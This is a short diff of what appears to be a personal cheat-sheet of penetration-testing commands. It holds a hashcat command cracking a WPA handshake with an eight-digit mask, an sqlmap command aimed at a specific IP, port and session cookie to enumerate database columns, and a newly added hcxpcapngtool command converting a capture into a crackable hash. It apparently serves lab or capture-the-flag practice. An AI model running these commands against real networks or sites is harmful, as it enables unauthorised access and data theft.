@@ -28,3 +28,6 @@ hashcat.exe -d 1 -m 22000 395733_1698859845.hc22000 -a 3 ?d?d?d?d?d?d?d?d
 
 
 sqlmap -u http://35.198.135.192:32157/index.php --cookie="PHPSESSID=d2ffbe7989f6b07058268c9376fb4e38" --forms --columns --random-agent
+
+hcxpcapngtool -O hash.hc2000 -E essidlist hash.pcpang
+
